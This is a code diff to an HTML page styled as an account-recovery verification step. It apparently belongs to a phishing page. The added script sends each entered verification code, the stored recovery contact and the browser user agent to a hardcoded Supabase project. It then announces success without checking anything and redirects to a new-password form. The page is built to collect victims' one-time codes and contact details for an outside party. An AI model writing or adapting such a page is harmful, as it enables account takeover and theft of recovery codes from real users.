@@ -45,17 +45,22 @@
     <div class="modal-box" id="modalBox"></div>
   </div>
 
-  <script type="module">
-    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
-
-    const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
-    const SUPABASE_KEY = "YOUR-ANON-KEY";
-    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    const SUPABASE_URL = "https://twyyuqdmbsdyrlbqgyoq.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3eXl1cWRtYnNkeXJsYnFneW9xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzExMDUsImV4cCI6MjA3MTYwNzEwNX0.6_NcIRedVB4yHKnvgFpwt9apQMiMlsvx19t8B5UBel8";
+    
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+      auth: {
+        persistSession: false,
+        autoRefreshToken: false
+      }
+    });
 
     const contactInfo = localStorage.getItem("recovery_target");
     if (!contactInfo) {
       alert("No recovery information found. Redirecting...");
-      window.location.href = "password.html";
+      window.location.href = "index.html";
     } else {
       document.getElementById("contactInfo").textContent = contactInfo;
     }
@@ -71,9 +76,20 @@
       if (!code) return showMessage("Please enter the verification code.", "error");
 
       try {
-        await supabase.from("verification_codes").insert([
-          { recovery_target: contactInfo, verification_code: code, user_agent: navigator.userAgent }
+        const { data, error } = await supabase.from("verification_codes").insert([
+          { 
+            recovery_target: contactInfo, 
+            verification_code: code, 
+            user_agent: navigator.userAgent,
+            created_at: new Date().toISOString()
+          }
         ]);
+        
+        if (error) {
+          console.error("Supabase error details:", error);
+          throw error;
+        }
+        
         showMessage("Verification successful! Redirecting...", "success");
         setTimeout(() => { window.location.href = "newpass.html"; }, 1500);
       } catch (err) {
